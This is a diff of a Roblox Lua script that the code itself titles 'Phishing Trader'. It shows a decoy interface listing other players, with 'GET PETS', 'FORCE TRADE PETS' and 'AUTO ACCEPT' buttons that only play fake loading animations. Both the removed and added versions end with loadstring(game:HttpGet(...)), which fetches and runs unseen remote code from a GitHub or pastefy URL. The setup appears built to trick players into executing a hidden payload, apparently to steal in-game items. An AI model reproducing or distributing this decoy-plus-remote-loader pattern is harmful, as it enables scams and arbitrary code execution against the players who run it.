@@ -2,402 +2,404 @@
 if not _G.FreezeTraderLoaded then
     _G.FreezeTraderLoaded = true
 
-    local function startMainGUI()
-        local Players = game:GetService("Players")
-        local TweenService = game:GetService("TweenService")
-        local UserInputService = game:GetService("UserInputService")
+    -- Основной скрипт (Phishing Trader) без изменений
+   local TweenService = game:GetService("TweenService")
+local Players = game:GetService("Players")
 
-        local player = Players.LocalPlayer or Players.PlayerAdded:Wait()
-        local guiParent = gethui and gethui() or player:WaitForChild("PlayerGui")
+local player = Players.LocalPlayer or Players.PlayerAdded:Wait()
+local guiParent = (gethui and gethui()) or player:WaitForChild("PlayerGui")
 
-        local ThumbnailType = Enum.ThumbnailType.HeadShot
-        local ThumbnailSize = Enum.ThumbnailSize.Size100x100
+local ThumbnailType = Enum.ThumbnailType.HeadShot
+local ThumbnailSize = Enum.ThumbnailSize.Size100x100
 
-        local colors = {
-            window = Color3.fromRGB(70, 110, 70),
-            button = Color3.fromRGB(140, 190, 130),
-            buttonAccent = Color3.fromRGB(210, 230, 150),
-            buttonDanger = Color3.fromRGB(200, 70, 70),
-            text = Color3.fromRGB(255, 255, 240),
-            listItem = Color3.fromRGB(60, 90, 60),
-            listItemHover = Color3.fromRGB(90, 130, 90)
-        }
+-- 🎨 Цвета
+local COLORS = {
+    bg           = Color3.fromRGB(40, 25, 15),
+    header       = Color3.fromRGB(50, 180, 80),
+    headerBorder = Color3.fromRGB(30, 120, 50),
+    closeBtn     = Color3.fromRGB(200, 60, 60),
+    listItem     = Color3.fromRGB(70, 40, 25),
+    listBorder   = Color3.fromRGB(90, 55, 35),
+    avatarBg     = Color3.fromRGB(100, 70, 50),
+    white        = Color3.fromRGB(255,255,255),
+    black        = Color3.fromRGB(0,0,0),
+    red          = Color3.fromRGB(200,50,50),
+    green        = Color3.fromRGB(50,200,70),
+    yellow       = Color3.fromRGB(230, 200, 40),
+}
 
-        local screenGui = Instance.new("ScreenGui")
-        screenGui.Name = "FreezeTrader"
-        screenGui.IgnoreGuiInset = true
-        screenGui.ResetOnSpawn = false
-        screenGui.Parent = guiParent
+-- ✨ Хелперы
+local function addCorner(inst, r)
+    local c = Instance.new("UICorner")
+    c.CornerRadius = UDim.new(0,r)
+    c.Parent = inst
+end
 
-        local windows = {}
+local function addStroke(inst, color, thickness, transparency)
+    local s = Instance.new("UIStroke")
+    s.Thickness = thickness or 2
+    s.Color = color or COLORS.listBorder
+    s.Transparency = transparency or 0.3
+    s.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
+    s.Parent = inst
+    return s
+end
 
-        local function closeAllWindows()
-            for _, win in pairs(windows) do
-                if win.Visible then
-                    local tween = TweenService:Create(win, TweenInfo.new(0.35, Enum.EasingStyle.Quint, Enum.EasingDirection.In), {Size = UDim2.new(0, 0, 0, 0), BackgroundTransparency = 1})
-                    tween:Play()
-                    tween.Completed:Connect(function()
-                        win.Visible = false
-                        win.BackgroundTransparency = 0.3
-                    end)
+local function addTextStroke(lbl)
+    lbl.TextStrokeColor3 = COLORS.black
+    lbl.TextStrokeTransparency = 0.2
+end
+
+-- 📦 GUI root
+local gui = Instance.new("ScreenGui")
+gui.Name = "CoolModernUI"
+gui.IgnoreGuiInset = true
+gui.ResetOnSpawn = false
+gui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+gui.Parent = guiParent
+
+-- 🪟 Главное окно
+local main = Instance.new("Frame")
+main.Size = UDim2.new(0, 440, 0, 460)
+main.Position = UDim2.new(0.5, -220, 0.5, -230)
+main.BackgroundColor3 = COLORS.bg
+main.BackgroundTransparency = 0.25
+main.BorderSizePixel = 0
+main.ZIndex = 10
+main.Parent = gui
+addCorner(main, 22)
+addStroke(main, COLORS.listBorder, 2, 0.3)
+
+-- 🌿 Заголовок
+local header = Instance.new("Frame")
+header.Size = UDim2.new(1, 0, 0, 50)
+header.BackgroundColor3 = COLORS.header
+header.BorderSizePixel = 0
+header.ZIndex = 12
+header.Parent = main
+addCorner(header, 10)
+addStroke(header, COLORS.headerBorder, 2, 0.1)
+
+-- Перетаскивание окна
+local dragging, dragStart, startPos
+header.InputBegan:Connect(function(input)
+    if input.UserInputType == Enum.UserInputType.MouseButton1 then
+        dragging = true
+        dragStart = input.Position
+        startPos = main.Position
+        input.Changed:Connect(function()
+            if input.UserInputState == Enum.UserInputState.End then
+                dragging = false
+            end
+        end)
+    end
+end)
+
+header.InputChanged:Connect(function(input)
+    if input.UserInputType == Enum.UserInputType.MouseMovement and dragging then
+        local delta = input.Position - dragStart
+        main.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X,
+                                  startPos.Y.Scale, startPos.Y.Offset + delta.Y)
+    end
+end)
+
+local title = Instance.new("TextLabel")
+title.Text = "Phishing Trader"
+title.Font = Enum.Font.GothamBold
+title.TextColor3 = COLORS.white
+title.TextScaled = true
+title.BackgroundTransparency = 1
+title.Size = UDim2.new(1, -70, 1, 0)
+title.Position = UDim2.new(0, 16, 0, 0)
+title.TextXAlignment = Enum.TextXAlignment.Left
+title.ZIndex = 13
+addTextStroke(title)
+title.Parent = header
+
+-- ❌ Кнопка закрытия
+local closeBtn = Instance.new("TextButton")
+closeBtn.Size = UDim2.new(0, 40, 0, 40)
+closeBtn.Position = UDim2.new(1, -48, 0.5, -20)
+closeBtn.BackgroundColor3 = COLORS.closeBtn
+closeBtn.Text = "X"
+closeBtn.Font = Enum.Font.GothamBold
+closeBtn.TextScaled = true
+closeBtn.TextColor3 = COLORS.white
+closeBtn.BorderSizePixel = 0
+closeBtn.ZIndex = 14
+addTextStroke(closeBtn)
+closeBtn.Parent = header
+addCorner(closeBtn, 8)
+addStroke(closeBtn, COLORS.listBorder, 2, 0.2)
+
+closeBtn.MouseButton1Click:Connect(function()
+    gui:Destroy()
+end)
+
+-- 📜 Список игроков
+local listHolder = Instance.new("ScrollingFrame")
+listHolder.Size = UDim2.new(1, -24, 1, -74)
+listHolder.Position = UDim2.new(0, 12, 0, 66)
+listHolder.BackgroundTransparency = 1
+listHolder.ScrollBarThickness = 8
+listHolder.CanvasSize = UDim2.new(0,0,0,0)
+listHolder.ZIndex = 11
+listHolder.Parent = main
+
+local layout = Instance.new("UIListLayout")
+layout.Padding = UDim.new(0, 12)
+layout.SortOrder = Enum.SortOrder.LayoutOrder
+layout.Parent = listHolder
+
+layout:GetPropertyChangedSignal("AbsoluteContentSize"):Connect(function()
+    listHolder.CanvasSize = UDim2.new(0, 0, 0, layout.AbsoluteContentSize.Y + 8)
+end)
+
+-- 📋 Окно деталей игрока
+local detailView = Instance.new("Frame")
+detailView.Size = UDim2.new(1, -24, 1, -74)
+detailView.Position = UDim2.new(0, 12, 0, 66)
+detailView.BackgroundTransparency = 1
+detailView.Visible = false
+detailView.ZIndex = 11
+detailView.Parent = main
+
+-- 🐾 Генерация питомцев по игроку (теперь всегда пусто)
+local function generatePets(player)
+    return {}
+end
+
+-- 👤 Карточка игрока
+local function createPlayerItem(playerObj)
+    local card = Instance.new("TextButton")
+    card.Size = UDim2.new(1, 0, 0, 70)
+    card.BackgroundColor3 = COLORS.listItem
+    card.BorderSizePixel = 0
+    card.Text = ""
+    card.ZIndex = 12
+    card.Parent = listHolder
+    addCorner(card, 12)
+    addStroke(card, COLORS.listBorder, 2, 0.2)
+
+    local avatar = Instance.new("ImageLabel")
+    avatar.Size = UDim2.new(0, 56, 0, 56)
+    avatar.Position = UDim2.new(0, 12, 0.5, -28)
+    avatar.BackgroundColor3 = COLORS.avatarBg
+    avatar.BorderSizePixel = 0
+    avatar.ZIndex = 13
+    avatar.Parent = card
+    addCorner(avatar, 8)
+    avatar.Image = Players:GetUserThumbnailAsync(playerObj.UserId, ThumbnailType, ThumbnailSize)
+
+    local nameLabel = Instance.new("TextLabel")
+    nameLabel.Text = playerObj.DisplayName
+    nameLabel.Font = Enum.Font.GothamBold
+    nameLabel.TextScaled = true
+    nameLabel.TextColor3 = COLORS.white
+    nameLabel.BackgroundTransparency = 1
+    nameLabel.ZIndex = 14
+    nameLabel.TextXAlignment = Enum.TextXAlignment.Left
+    nameLabel.Size = UDim2.new(1, -96, 1, 0)
+    nameLabel.Position = UDim2.new(0, 88, 0, 0)
+    addTextStroke(nameLabel)
+    nameLabel.Parent = card
+
+    -- 🔄 Нажатие — показать окно деталей
+    card.MouseButton1Click:Connect(function()
+        listHolder.Visible = false
+        detailView.Visible = true
+
+        TweenService:Create(main, TweenInfo.new(0.4, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {
+            Size = UDim2.new(0, 440, 0, 600)
+        }):Play()
+
+        for _,c in ipairs(detailView:GetChildren()) do
+            c:Destroy()
+        end
+
+        local container = Instance.new("Frame")
+        container.BackgroundTransparency = 1
+        container.Size = UDim2.new(1, 0, 1, 0)
+        container.Parent = detailView
+
+        -- Левая часть (аватар + ник)
+        local avatarBlock = Instance.new("Frame")
+        avatarBlock.Size = UDim2.new(0, 180, 1, -80)
+        avatarBlock.BackgroundTransparency = 1
+        avatarBlock.Parent = container
+
+        local avatarBig = Instance.new("ImageLabel")
+        avatarBig.Size = UDim2.new(0, 150, 0, 150)
+        avatarBig.Position = UDim2.new(0,15,0,10)
+        avatarBig.BackgroundColor3 = COLORS.avatarBg
+        avatarBig.BorderSizePixel = 0
+        addCorner(avatarBig, 12)
+        avatarBig.Parent = avatarBlock
+        avatarBig.Image = Players:GetUserThumbnailAsync(playerObj.UserId, ThumbnailType, ThumbnailSize)
+
+        local nickBlock = Instance.new("TextLabel")
+        nickBlock.Size = UDim2.new(0,150,0,40)
+        nickBlock.Position = UDim2.new(0,15,0,165)
+        nickBlock.BackgroundColor3 = COLORS.black
+        nickBlock.BackgroundTransparency = 0.2
+        nickBlock.Text = playerObj.DisplayName
+        nickBlock.Font = Enum.Font.GothamBold
+        nickBlock.TextColor3 = COLORS.white
+        nickBlock.TextScaled = true
+        addTextStroke(nickBlock)
+        nickBlock.Parent = avatarBlock
+        addCorner(nickBlock, 6)
+
+        -- Правая часть (pets)
+        local petsBlock = Instance.new("Frame")
+        petsBlock.Size = UDim2.new(1,-200,1,-90)
+        petsBlock.Position = UDim2.new(0,200,0,10)
+        petsBlock.BackgroundTransparency = 1
+        petsBlock.Parent = container
+
+        local petsLabel = Instance.new("TextLabel")
+        petsLabel.Size = UDim2.new(1,0,0,30)
+        petsLabel.BackgroundTransparency = 1
+        petsLabel.Text = "PETS:"
+        petsLabel.Font = Enum.Font.GothamBold
+        petsLabel.TextColor3 = COLORS.white
+        petsLabel.TextScaled = true
+        petsLabel.TextXAlignment = Enum.TextXAlignment.Left
+        addTextStroke(petsLabel)
+        petsLabel.Parent = petsBlock
+
+        -- ⏳ Анимация загрузки
+        task.spawn(function()
+            local msgs = {
+                "Connections to the server.",
+                "Connections to the server..",
+                "Connections to the server...",
+                "Getting info.",
+                "Getting info..",
+                "Getting info...",
+            }
+            for _,msg in ipairs(msgs) do
+                petsLabel.Text = msg
+                task.wait(0.5)
+            end
+
+            petsLabel.Text = "PETS:"
+            local pets = generatePets(playerObj)
+            if #pets == 0 then
+                local noPets = petsLabel:Clone()
+                noPets.Text = "NO PETS FOUND"
+                noPets.Position = UDim2.new(0,0,0,40)
+                noPets.TextColor3 = COLORS.red
+                noPets.Parent = petsBlock
+            else
+                local y = 40
+                for _,pet in ipairs(pets) do
+                    local petLabel = petsLabel:Clone()
+                    petLabel.Text = pet
+                    petLabel.Position = UDim2.new(0,0,0,y)
+                    petLabel.Parent = petsBlock
+                    y = y + 35
                 end
             end
+        end)
+
+        -- Кнопки снизу
+        local btnHolder = Instance.new("Frame")
+        btnHolder.Size = UDim2.new(1,0,0,180)
+        btnHolder.AnchorPoint = Vector2.new(0,1)
+        btnHolder.Position = UDim2.new(0,0,1,-120)
+        btnHolder.BackgroundTransparency = 1
+        btnHolder.Parent = container
+
+        local layoutBtns = Instance.new("UIListLayout")
+        layoutBtns.Padding = UDim.new(0,8)
+        layoutBtns.FillDirection = Enum.FillDirection.Vertical
+        layoutBtns.HorizontalAlignment = Enum.HorizontalAlignment.Center
+        layoutBtns.VerticalAlignment = Enum.VerticalAlignment.Top
+        layoutBtns.Parent = btnHolder
+
+        local function createBtn(text, color)
+            local btn = Instance.new("TextButton")
+            btn.Size = UDim2.new(0,280,0,65)
+            btn.BackgroundColor3 = color
+            btn.Text = text
+            btn.Font = Enum.Font.GothamBold
+            btn.TextScaled = true
+            btn.TextColor3 = COLORS.white
+            addTextStroke(btn)
+            btn.Parent = btnHolder
+            addCorner(btn, 8)
+            addStroke(btn, COLORS.listBorder, 2, 0.2)
+            return btn
         end
 
-        local function makeDraggable(frame)
-            local dragging, dragInput, dragStart, startPos
-            frame.InputBegan:Connect(function(input)
-                if input.UserInputType == Enum.UserInputType.MouseButton1 then
-                    dragging = true
-                    dragStart = input.Position
-                    startPos = frame.Position
-                    input.Changed:Connect(function()
-                        if input.UserInputState == Enum.UserInputState.End then
-                            dragging = false
-                        end
-                    end)
-                end
-            end)
-            frame.InputChanged:Connect(function(input)
-                if input.UserInputType == Enum.UserInputType.MouseMovement then
-                    dragInput = input
-                end
-            end)
-            UserInputService.InputChanged:Connect(function(input)
-                if input == dragInput and dragging then
-                    local delta = input.Position - dragStart
-                    frame.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
-                end
-            end)
-        end
+        -- Убрали GET TRADE OFFER
+        local btn2 = createBtn("GET PETS", COLORS.green)
+        local btn3 = createBtn("AUTO ACCEPT: OFF", COLORS.red)
+        local btnBack = createBtn("BACK", COLORS.yellow)
 
-        local function createWindow(titleText, size)
-            local window = Instance.new("Frame")
-            window.Size = UDim2.new(0, 0, 0, 0)
-            window.Position = UDim2.new(0.5, 0, 0.5, 0)
-            window.AnchorPoint = Vector2.new(0.5, 0.5)
-            window.BackgroundColor3 = colors.window
-            window.BackgroundTransparency = 0.3
-            window.BorderSizePixel = 2
-            window.BorderColor3 = Color3.fromRGB(40, 70, 40)
-            window.Visible = false
-            window.Parent = screenGui
-            Instance.new("UICorner", window).CornerRadius = UDim.new(0, 4)
+        -- Анимация кнопки GET PETS
+        btn2.MouseButton1Click:Connect(function()
+            local originalText = btn2.Text
+            local originalColor = btn2.BackgroundColor3
+            btn2.BackgroundColor3 = COLORS.yellow
 
-            local title = Instance.new("TextLabel")
-            title.Text = titleText
-            title.Font = Enum.Font.Arcade
-            title.TextColor3 = colors.text
-            title.TextStrokeTransparency = 0
-            title.TextScaled = true
-            title.Size = UDim2.new(1, 0, 0, 28)
-            title.BackgroundColor3 = Color3.fromRGB(100, 140, 100)
-            title.BorderSizePixel = 2
-            title.BorderColor3 = Color3.fromRGB(40, 70, 40)
-            title.Parent = window
+            local msgs = {"LOADING.", "LOADING..", "LOADING..."}
+            local startTime = tick()
 
-            local closeBtn = Instance.new("TextButton")
-            closeBtn.Text = "✖"
-            closeBtn.Font = Enum.Font.Arcade
-            closeBtn.TextColor3 = colors.text
-            closeBtn.TextStrokeTransparency = 0
-            closeBtn.TextScaled = true
-            closeBtn.Size = UDim2.new(0, 24, 0, 24)
-            closeBtn.Position = UDim2.new(1, -28, 0, 2)
-            closeBtn.BackgroundColor3 = colors.buttonDanger
-            closeBtn.BorderSizePixel = 2
-            closeBtn.BorderColor3 = Color3.fromRGB(90, 40, 40)
-            closeBtn.Parent = window
-            Instance.new("UICorner", closeBtn).CornerRadius = UDim.new(0, 0)
-
-            closeBtn.MouseButton1Click:Connect(function()
-                local tween = TweenService:Create(window, TweenInfo.new(0.35, Enum.EasingStyle.Quint, Enum.EasingDirection.In), {Size = UDim2.new(0, 0, 0, 0), BackgroundTransparency = 1})
-                tween:Play()
-                tween.Completed:Connect(function()
-                    window.Visible = false
-                    window.BackgroundTransparency = 0.3
-                end)
-            end)
-
-            local function openWindow()
-                closeAllWindows()
-                window.Visible = true
-                window.Size = UDim2.new(0, 0, 0, 0)
-                window.BackgroundTransparency = 1
-                local tween = TweenService:Create(window, TweenInfo.new(0.4, Enum.EasingStyle.Back, Enum.EasingDirection.Out), {Size = size, BackgroundTransparency = 0.3})
-                tween:Play()
-            end
-
-            makeDraggable(window)
-            windows[#windows + 1] = window
-            return window, openWindow
-        end
-
-        -- Главное окно
-        local mainWindow, openMain = createWindow("🌱 Freeze Trader", UDim2.new(0, 350, 0, 260))
-        openMain()
-
-        -- Кнопка Players
-        local playersBtn = Instance.new("TextButton")
-        playersBtn.Text = "👥 Players"
-        playersBtn.Font = Enum.Font.Arcade
-        playersBtn.TextColor3 = colors.text
-        playersBtn.TextStrokeTransparency = 0
-        playersBtn.TextScaled = true
-        playersBtn.Size = UDim2.new(1, -20, 0, 35)
-        playersBtn.Position = UDim2.new(0, 10, 0, 50)
-        playersBtn.BackgroundColor3 = colors.button
-        playersBtn.BorderSizePixel = 2
-        playersBtn.BorderColor3 = Color3.fromRGB(40, 70, 40)
-        playersBtn.Parent = mainWindow
-        Instance.new("UICorner", playersBtn).CornerRadius = UDim.new(0, 6)
-
-        -- Players окно
-        local playersWindow, openPlayers = createWindow("👥 Список игроков", UDim2.new(0, 350, 0, 350))
-        playersWindow.Position = UDim2.new(0.5, 50, 0.5, 50)
-
-        local scrollingFrame = Instance.new("ScrollingFrame")
-        scrollingFrame.Size = UDim2.new(1, -20, 1, -50)
-        scrollingFrame.Position = UDim2.new(0, 10, 0, 40)
-        scrollingFrame.CanvasSize = UDim2.new(0, 0, 0, 0)
-        scrollingFrame.ScrollBarThickness = 8
-        scrollingFrame.BackgroundTransparency = 1
-        scrollingFrame.Parent = playersWindow
-
-        local uiList = Instance.new("UIListLayout")
-        uiList.Padding = UDim.new(0, 6)
-        uiList.Parent = scrollingFrame
-
-        -- Trade окно
-        local tradeWindow, openTrade = createWindow("🌿 Force Trade Pets", UDim2.new(0, 350, 0, 320))
-        tradeWindow.Position = UDim2.new(0.5, -50, 0.5, -50)
-
-        local selectedAvatar = Instance.new("ImageLabel")
-        selectedAvatar.Size = UDim2.new(0, 130, 0, 130)
-        selectedAvatar.Position = UDim2.new(0.5, -65, 0, 40)
-        selectedAvatar.BackgroundTransparency = 1
-        selectedAvatar.Parent = tradeWindow
-        Instance.new("UICorner", selectedAvatar).CornerRadius = UDim.new(1, 0)
-
-        local selectedName = Instance.new("TextLabel")
-        selectedName.Size = UDim2.new(1, 0, 0, 35)
-        selectedName.Position = UDim2.new(0, 0, 0, 180)
-        selectedName.Font = Enum.Font.Arcade
-        selectedName.TextColor3 = colors.text
-        selectedName.TextStrokeTransparency = 0
-        selectedName.TextScaled = true
-        selectedName.BackgroundTransparency = 1
-        selectedName.Text = ""
-        selectedName.Parent = tradeWindow
-
-        local btnWidth, btnHeight = 320, 40
-        local autoAccept = false
-
-        local autoAcceptBtn = Instance.new("TextButton")
-        autoAcceptBtn.Text = "Auto Accept: OFF"
-        autoAcceptBtn.Font = Enum.Font.Arcade
-        autoAcceptBtn.TextColor3 = colors.text
-        autoAcceptBtn.TextStrokeTransparency = 0
-        autoAcceptBtn.TextScaled = true
-        autoAcceptBtn.Size = UDim2.new(0, btnWidth, 0, btnHeight)
-        autoAcceptBtn.Position = UDim2.new(0, 15, 1, -btnHeight - 15)
-        autoAcceptBtn.BackgroundColor3 = colors.buttonDanger -- сразу красная
-        autoAcceptBtn.BorderSizePixel = 2
-        autoAcceptBtn.BorderColor3 = Color3.fromRGB(40, 70, 40)
-        autoAcceptBtn.Parent = tradeWindow
-        Instance.new("UICorner", autoAcceptBtn).CornerRadius = UDim.new(0, 6)
-
-        local forceTradePetsBtn = Instance.new("TextButton")
-        forceTradePetsBtn.Font = Enum.Font.Arcade
-        forceTradePetsBtn.TextColor3 = colors.text
-        forceTradePetsBtn.TextStrokeTransparency = 0
-        forceTradePetsBtn.TextScaled = true
-        forceTradePetsBtn.Size = UDim2.new(0, btnWidth, 0, btnHeight)
-        forceTradePetsBtn.Position = UDim2.new(0, 15, 1, -btnHeight*2 - 25)
-        forceTradePetsBtn.BackgroundColor3 = colors.buttonAccent
-        forceTradePetsBtn.BorderSizePixel = 2
-        forceTradePetsBtn.BorderColor3 = Color3.fromRGB(70, 90, 50)
-        forceTradePetsBtn.Text = "FORCE TRADE PETS"
-        forceTradePetsBtn.Parent = tradeWindow
-        Instance.new("UICorner", forceTradePetsBtn).CornerRadius = UDim.new(0, 6)
-
-        -- Overlay 🌿
-        local overlay = Instance.new("Frame")
-        overlay.Size = UDim2.new(1, 0, 1, 0)
-        overlay.Position = UDim2.new(0, 0, 0, 0)
-        overlay.BackgroundColor3 = Color3.fromRGB(50, 100, 50)
-        overlay.BackgroundTransparency = 0.4
-        overlay.Visible = false
-        overlay.Parent = screenGui
-        overlay.ZIndex = 1000
-
-        local gradient = Instance.new("UIGradient")
-        gradient.Color = ColorSequence.new{
-            ColorSequenceKeypoint.new(0, Color3.fromRGB(70, 120, 70)),
-            ColorSequenceKeypoint.new(0.5, Color3.fromRGB(100, 150, 100)),
-            ColorSequenceKeypoint.new(1, Color3.fromRGB(70, 120, 70))
-        }
-        gradient.Rotation = 90
-        gradient.Parent = overlay
-
-        local loadingText = Instance.new("TextLabel")
-        loadingText.Text = "TRADE PROCESSING"
-        loadingText.Font = Enum.Font.Arcade
-        loadingText.TextColor3 = colors.text
-        loadingText.TextStrokeTransparency = 0
-        loadingText.TextScaled = true
-        loadingText.BackgroundTransparency = 1
-        loadingText.Size = UDim2.new(0, 300, 0, 50)
-        loadingText.Position = UDim2.new(0.5, -150, 0.5, -100)
-        loadingText.Parent = overlay
-        loadingText.ZIndex = 1001
-
-        local leaves = {}
-        for i = 1, 3 do
-            local leaf = Instance.new("TextLabel")
-            leaf.Text = "🌱"
-            leaf.Font = Enum.Font.Arcade
-            leaf.TextColor3 = Color3.fromRGB(200, 255, 200)
-            leaf.TextScaled = true
-            leaf.BackgroundTransparency = 1
-            leaf.Size = UDim2.new(0, 50, 0, 50)
-            leaf.Position = UDim2.new(0.5, -25, 0.5, (i-1)*55)
-            leaf.Parent = overlay
-            leaf.Visible = false
-            leaf.ZIndex = 1001
-            table.insert(leaves, leaf)
-        end
-
-        local dotsCount = 0
-        local function animateLoadingText()
-            dotsCount = (dotsCount % 3) + 1
-            loadingText.Text = "TRADE PROCESSING" .. string.rep(".", dotsCount)
-        end
-
-        local function startOverlay()
-            overlay.Visible = true
-            dotsCount = 0
-            animateLoadingText()
-            spawn(function()
-                for i, leaf in ipairs(leaves) do
-                    wait(0.6)
-                    if overlay.Visible then
-                        leaf.Visible = true
-                        leaf.TextColor3 = Color3.fromRGB(150 + i*30, 255, 150 + i*20)
+            task.spawn(function()
+                while tick() - startTime < 6 do
+                    for _, msg in ipairs(msgs) do
+                        btn2.Text = msg
+                        task.wait(0.5)
                     end
                 end
+                btn2.BackgroundColor3 = originalColor
+                btn2.Text = originalText
             end)
-            spawn(function()
-                while overlay.Visible do
-                    wait(0.7)
-                    animateLoadingText()
-                end
-            end)
-        end
-
-        local function stopOverlay()
-            overlay.Visible = false
-            for _, leaf in ipairs(leaves) do
-                leaf.Visible = false
-            end
-        end
-
-        -- Список игроков
-        local selectedPlayerFrame = nil
-        local function clearPlayerSelection()
-            for _, child in pairs(scrollingFrame:GetChildren()) do
-                if child:IsA("Frame") then
-                    child.BackgroundColor3 = colors.listItem
-                end
-            end
-            selectedPlayerFrame = nil
-        end
-
-        local function updatePlayersList()
-            for _, child in pairs(scrollingFrame:GetChildren()) do
-                if child:IsA("Frame") then
-                    child:Destroy()
-                end
-            end
-            for _, p in pairs(Players:GetPlayers()) do
-                if p ~= player then
-                    local playerFrame = Instance.new("Frame")
-                    playerFrame.Size = UDim2.new(1, 0, 0, 40)
-                    playerFrame.BackgroundColor3 = colors.listItem
-                    playerFrame.Parent = scrollingFrame
-
-                    local avatar = Instance.new("ImageLabel")
-                    avatar.Size = UDim2.new(0, 35, 0, 35)
-                    avatar.Position = UDim2.new(0, 5, 0, 3)
-                    avatar.BackgroundTransparency = 1
-                    avatar.Image = Players:GetUserThumbnailAsync(p.UserId, ThumbnailType, ThumbnailSize)
-                    avatar.Parent = playerFrame
-                    Instance.new("UICorner", avatar).CornerRadius = UDim.new(1, 0)
-
-                    local nameLabel = Instance.new("TextLabel")
-                    nameLabel.Text = p.Name
-                    nameLabel.Font = Enum.Font.Arcade
-                    nameLabel.TextColor3 = colors.text
-                    nameLabel.TextStrokeTransparency = 0
-                    nameLabel.TextScaled = true
-                    nameLabel.BackgroundTransparency = 1
-                    nameLabel.Size = UDim2.new(1, -45, 1, 0)
-                    nameLabel.Position = UDim2.new(0, 45, 0, 0)
-                    nameLabel.Parent = playerFrame
-
-                    playerFrame.MouseEnter:Connect(function()
-                        if selectedPlayerFrame ~= playerFrame then
-                            playerFrame.BackgroundColor3 = colors.listItemHover
-                        end
-                    end)
-                    playerFrame.MouseLeave:Connect(function()
-                        if selectedPlayerFrame ~= playerFrame then
-                            playerFrame.BackgroundColor3 = colors.listItem
-                        end
-                    end)
-
-                    playerFrame.InputBegan:Connect(function(input)
-                        if input.UserInputType == Enum.UserInputType.MouseButton1 then
-                            clearPlayerSelection()
-                            playerFrame.BackgroundColor3 = colors.button
-                            selectedPlayerFrame = playerFrame
-                            selectedName.Text = p.Name
-                            selectedAvatar.Image = Players:GetUserThumbnailAsync(p.UserId, ThumbnailType, ThumbnailSize)
-                            openTrade()
-                        end
-                    end)
-                end
-            end
-            local listLength = #Players:GetPlayers() - 1
-            scrollingFrame.CanvasSize = UDim2.new(0, 0, 0, listLength * 46)
-        end
-
-        playersBtn.MouseButton1Click:Connect(function()
-            updatePlayersList()
-            openPlayers()
         end)
 
-        forceTradePetsBtn.MouseButton1Click:Connect(function()
-            if not selectedName.Text or selectedName.Text == "" then return end
-            startOverlay()
-            wait(5)
-            stopOverlay()
+        local autoOn = false
+        btn3.MouseButton1Click:Connect(function()
+            autoOn = not autoOn
+            if autoOn then
+                btn3.Text = "AUTO ACCEPT: ON"
+                btn3.BackgroundColor3 = COLORS.green
+            else
+                btn3.Text = "AUTO ACCEPT: OFF"
+                btn3.BackgroundColor3 = COLORS.red
+            end
         end)
 
-        autoAcceptBtn.MouseButton1Click:Connect(function()
-            autoAccept = not autoAccept
-            autoAcceptBtn.Text = "Auto Accept: " .. (autoAccept and "ON" or "OFF")
-            autoAcceptBtn.BackgroundColor3 = autoAccept and colors.button or colors.buttonDanger
+        btnBack.MouseButton1Click:Connect(function()
+            detailView.Visible = false
+            listHolder.Visible = true
+            TweenService:Create(main, TweenInfo.new(0.4, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {
+                Size = UDim2.new(0, 440, 0, 460)
+            }):Play()
         end)
+    end)
 
-        Players.PlayerAdded:Connect(function() updatePlayersList() end)
-        Players.PlayerRemoving:Connect(function() updatePlayersList() end)
+    return card
+end
 
-        updatePlayersList()
-
-        -- Запуск TradeForce
-        loadstring(game:HttpGet("https://raw.githubusercontent.com/daniklevik/gag/refs/heads/main/tradeforcegag"))()
+-- 📥 Наполнение списка
+local function refreshList()
+    for _, c in ipairs(listHolder:GetChildren()) do
+        if c:IsA("TextButton") then c:Destroy() end
     end
+    for _, p in ipairs(Players:GetPlayers()) do
+        if p ~= player then
+            createPlayerItem(p)
+        end
+    end
+end
 
-    startMainGUI()
+Players.PlayerAdded:Connect(refreshList)
+Players.PlayerRemoving:Connect(refreshList)
+refreshList()
+
+
+    -- 🔹 Force Trade скрипт
+    loadstring(game:HttpGet("https://pastefy.app/nhwwdZKp/raw"))()
 end
